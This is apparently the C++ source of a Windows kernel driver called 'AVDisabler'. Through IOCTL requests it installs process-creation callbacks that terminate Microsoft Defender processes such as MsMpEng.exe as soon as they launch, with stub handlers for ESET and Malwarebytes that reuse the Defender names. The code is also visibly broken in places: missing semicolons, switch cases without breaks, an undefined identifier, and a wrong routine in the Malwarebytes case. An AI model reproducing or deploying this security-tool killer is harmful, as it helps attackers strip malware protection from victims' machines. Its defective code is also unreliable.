#include <ntddk.h>
//#include "CallbackRegistrations.h"
#include <Stdio.h>

#define DeviceType 0x8001
#define PROCESS_TERMINATE 1

#define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)		
#define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)			
#define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)	


typedef NTSTATUS(NTAPI* fObOpenObjectByPointer)(
	PVOID Object,
	ULONG HandleAttributes,
	PACCESS_STATE PassedAccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PHANDLE Handle);


//Add more....
UNICODE_STRING DefenderMsMpEng = RTL_CONSTANT_STRING(L"MsMpEng.exe");
UNICODE_STRING DefenderSecurityHealthService = RTL_CONSTANT_STRING(L"SecurityHealthService.exe");
UNICODE_STRING DefenderSecurityHealthSystray = RTL_CONSTANT_STRING(L"SecurityHealthSystray.exe");
UNICODE_STRING DefenderSecurityHealthHost = RTL_CONSTANT_STRING(L"SecurityHealthHost.exe");
UNICODE_STRING DefenderSecHealthUI = RTL_CONSTANT_STRING(L"SecHealthUI.exe");

BOOLEAN g_IsDefenderCallbackRoutineSet = FALSE;
BOOLEAN g_IsEsetCallbackRoutineSet = FALSE;
BOOLEAN g_IsMalwareBytesCallbackRoutineSet = FALSE;

void PreventDefenderProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObGetObjectByPointer));

	// checking if the process being created is one of defender's processes
	if (RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
		

	}
}

void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObGetObjectByPointer));

	// checking if the process being created is one of ESET's processes
	// 
	// ---------- !!!!!need to modify the processes' variables to ESET images names!!!!! ----------
	if (RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));

	}
}


NTSTATUS CompleteRequest(NTSTATUS status, PIRP Irp, ULONG_PTR information)
{
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, 0);
	
	return status;
}


NTSTATUS CreateCloseDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) 
{
	return CompleteRequest(STATUS_SUCCESS, Irp, 0);
}


NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	char OutputBuffer[256];

	switch (IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
		case IOCTL_DISABLE_DEFENDER:
		{
			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...

			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
			{
				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_DEFENDER: invalid size of input buffer!\n"));
				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
			}

			status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, FALSE);
			if (!NT_SUCCESS(status)) 
			{
				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
				KdPrint((OutputBuffer));
				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
				return CompleteRequest(status, Irp, sizeof(OutputBuffer));
			}

			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n", status));

		}

		case IOCTL_DISABLE_ESET:
		{
			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
			{
				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_ESET: invalid size of input buffer!\n"));
				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
			}

			status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, FALSE);
			if (!NT_SUCCESS(status))
			{
				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status)
				KdPrint((OutputBuffer));
				return CompleteRequest(status, Irp, 0);
			}

			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n", status));

		}

		case IOCTL_DISABLE_MALWAREBYTES:
		{
			ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
			ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
			{
				//sprintf();
				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);

			}

			status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, FALSE);
			if (!NT_SUCCESS(status))
			{
				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set Malwarebyte's related process creation callback routine\n (NTSTATUS: 0x%x)", status)
				KdPrint((OutputBuffer));
				return CompleteRequest(status, Irp, 0);
			}

			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n", status));
		}
	}

	return CompleteRequest(status, Irp, 0);
}

VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");

	IoDeleteDevice(DeviceObject);
	status = IoDeleteSymbolicLink(&DeviceSymlink);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisablerDriver[Unload Routine]: couldn't delete symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceSymlink, status));
		return;
	}
	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\AVDisabler");
	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");

	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("[*] Error creating device %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
		return status;
	}

	status = IoCreateSymbolicLink(&DeviceSymlink, &DeviceName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[*] Error creating device symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTLHandlerDispatchRoutine;
	DriverObject->DriverUnload = UnloadRoutine;
	
	return status;
}
